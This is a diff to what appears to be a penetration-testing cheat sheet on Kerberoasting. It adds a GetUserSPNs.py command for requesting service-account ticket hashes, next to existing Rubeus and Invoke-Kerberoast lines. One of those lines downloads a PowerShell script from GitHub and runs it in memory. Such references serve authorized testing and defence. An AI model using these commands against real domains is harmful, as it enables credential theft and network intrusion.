@@ -28,6 +28,8 @@ Requires AD Modules:
 ## Kerberoasting
 From Windows against single user using Rubeus.exe:   
 `.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
+From Linux using GetUserSPN.py:   
+`python3 GetUserSPNs.py domain.local/user1:p@ssw0rd -dc-ip 192.168.1.11 -request-user targetserviceuser`   
 Using Invoke-Kerberoast:    
 `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat`   
 
